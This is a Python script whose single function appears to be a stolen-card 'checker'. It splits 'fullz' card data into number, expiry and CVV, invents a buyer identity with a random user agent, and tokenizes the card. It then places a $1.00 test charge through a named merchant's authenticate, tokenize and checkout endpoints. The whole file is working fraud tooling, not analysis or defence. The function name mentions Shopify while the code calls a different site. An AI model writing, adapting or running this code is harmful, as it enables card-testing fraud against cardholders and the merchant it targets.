import asyncio
import base64
import random
import time
from urllib.parse import urlparse
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import json


async def create_shopify_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        address = "12 Main Street"
        city = "Brewster"
        state = "New York"
        zip_code = "10509"
        phone = "(727) 945-1000"
        response = requests.get('https://www.premierracingsetups.com/api/authenticate')
        
        # print(response.text)

        try:
            auth_token = response.json()['auth_token']
            print(f"Auth Token: {auth_token}")
        except Exception as e:
            return f"Failed to retrieve auth token: {str(e)}"

        headers = {
            'accept': '*/*',
            'authorization': f'Bearer {auth_token}',
            'content-type': 'application/json',
            'user-agent': user_agent,
        }
        json_data = {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
                'cardholderName': f"{fname} {lname}",
            },
            'options': {
                'validate': True,
            },
        }
        response = await session.post(
            'https://www.premierracingsetups.com/api/tokenize',
            headers=headers,
            json=json_data
        )
        try:
            token = response.json().get('token')
            print(f"Credit Card Token: {token}")
        except Exception as e:
            return f"Failed to tokenize credit card: {str(e)}"
        purchase_data = {
            'amount': 1.0,
            'currency': 'USD',
            'paymentMethodToken': token,
            'billingAddress': {
                'line1': address,
                'city': city,
                'state': state,
                'postalCode': zip_code,
                'country': 'US',
            },
            'customer': {
                'firstName': fname,
                'lastName': lname,
                'email': email,
                'phone': phone,
            },
        }
        response = requests.post(
            'https://www.premierracingsetups.com/api/checkout',
            headers=headers,
            json=purchase_data
        )
        print(f"Purchase Response: {response.text}")
        return response.text
    except Exception as e:
        return f"An error occurred: {str(e)}"
